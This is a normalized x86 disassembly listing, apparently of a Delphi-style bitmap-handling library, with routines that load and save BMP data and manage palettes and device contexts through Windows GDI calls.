mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_471d1c
mov eax ebx
call sub_471d2c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_471c58
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_470e84
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_470348
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_471e2c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
movzx ecx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_46f3b8
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_470348
push 0x0
call GetDC
call sub_46ecc0
mov esi eax
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x70 ] bl
test bl bl
je r-xdata
sub_471ee4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46eb94
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_47124c
mov eax [ esi + 0x28 ]
mov [ eax + 0x71 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_471d1c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectW
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_471f68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_427274
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_472644
pop esi
pop ebx
retn
sub_471f8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_472014
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
movzx edx [ ebp + 0xc ]
mov [ eax + 0x71 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_472074
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4705e4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_4705e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47207b
push rw-data
call LeaveCriticalSection
retn
sub_47208c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_472644
pop edx
pop edi
pop esi
pop ebx
retn
sub_4720b4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_44748c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4725d7
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4725aa
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
sub esi eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_447ae4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
movzx edx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
movzx edx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_46ebac
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_427538
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_447ae4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
movzx eax [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4274c8
mov eax [ ebx + 0x20 ]
movzx edx [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
movzx eax [ ebx + 0xe ]
call sub_46ee30
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_46ee50
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4274c8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
push 0x0
call GetDC
call sub_46ecc0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_472525
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_46f0fc
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_44748c
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_47248d
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4274c8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_472461
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_46f3b8
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_43ba38
call sub_46ebac
jmp r-xdata
xor eax eax
push ebp
push sub_4724f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4274c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472468
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47252c
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_43ba38
call sub_46ebac
jmp r-xdata
sub_472468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4474a8
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_47252c
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectW
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4725c1
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_46f3b8
mov [ ebp - 0x30 ] eax
sub_4725de
lea eax [ ebp - 0x9c ]
push eax
movzx eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_471f8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x39 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_471b34
sub_472644
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_471d1c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4274c8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_471f8c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4720b4
call sub_46ebac
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4726b4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_471d1c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectW
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_470e20
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_47274f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_471f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_472778
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_471a14
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_471d1c
mov eax esi
call sub_471e2c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_471d1c
mov eax esi
call sub_471e2c
mov eax esi
call sub_471ca8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_470e20
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_47124c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
movzx edx [ edi + 0x71 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_471f8c
jmp r-xdata
push esp
movzx edx [ edi + 0x71 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_471f8c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4707bc
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4728c4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_471d2c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
movzx eax bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_47124c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_472940
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_471d1c
mov eax ebx
call sub_471d2c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4707bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4729d8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
movzx eax [ esi + 0x71 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4706b4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_46c288
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4729dd
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_448ca8
call sub_448cfc
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4706b4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472a14
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_471a94
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_46eb94
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_447ae4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
movzx edx bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_472b60
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47124c
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_46ecc0
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_472b94
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_447ae4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_471ca8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_46fafc
cmp [ ebp + 0x71 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_427500
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_427500
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_447ae4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4719a8
movzx edx [ r-xdata ]
call sub_46e9a4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_46ecc0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
movzx eax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_470770
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x71 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_427500
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_427500
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
movzx edx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
movzx edx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
movzx eax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_427500
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_427500
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
movzx eax [ ebp + 0x71 ]
movzx ecx [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_427500
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_46f138
cmp [ ebp + 0x71 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
mov edx [ ebp + 0x2c ]
